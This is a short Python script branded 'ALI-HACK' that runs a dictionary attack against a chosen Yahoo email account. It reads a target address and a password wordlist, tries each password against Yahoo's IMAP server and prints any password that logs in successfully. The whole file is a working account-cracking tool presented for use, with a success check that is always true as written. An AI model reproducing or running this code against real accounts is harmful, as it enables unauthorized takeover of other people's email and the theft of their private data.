
import smtplib
import poplib, imaplib, smtplib, time, sys 
from imaplib import IMAP4
from poplib import POP3
print("===============================")
print("\033[33m   ___    ___     ")
print("  ( _<    >_ )    ")
print("  //        \\\   ")
print("  \\\___..___// ")
print("   `-(    )-'    ")    
print("     _|__|_ ")
print("    /_|__|_\ ")
print("    /_|__|_\ ")
print("    /_\__/_\ ")
print("     \ || /  _)  ")    
print("       ||   ( )  ")    
print("       \\\___// ")
print("        `---' ")
print("\033[31mALI-HACK :\033[37m Yahoo Hack Account")
print("Facebook:www.facebook.com/Ali20Hack")
print("Youtube:https://www.youtube.com/channel/UCkOu7kHM1aJkJw87d2FlG9Q")
print("===============================")

smtpserver = smtplib.SMTP('smtp.mail.yahoo.com' , 587)
smtpserver.ehlo()
smtpserver.starttls()

user =input('Enter The Email===>')
paso =input('Enter ThePass====>')
paso = open(paso,"r")
host = 'imap.mail.yahoo.com'
port = 993
print('START BRUTE :==|+[HACKER]+|==>:')
print('\a*-*-*-*-*-*-*-*-*-*-*')
print(user)
print('*-*-*-*-*-*-*-*-*-*-*')
for password in paso :
 try:
     session = imaplib.IMAP4_SSL(host, port) 
     y = session.login(user, password[:-1])
     if (y == 'OK' or 'AUTHENTICATE completed'):
         print (">\033[32m[!-OK-!]\033[37m Correct Password have been found....!\n\r")
         time.sleep(2)
         print( "Email: {0}".format(user)+"\n\r")
         print ("Password is: {0}".format(password)+"\n\r\n\r\n\r")
         session.logout()
         break;
 except :
    print ("\033[31m[!-NO-!]\033[37m Faild Passowrd====>", password)
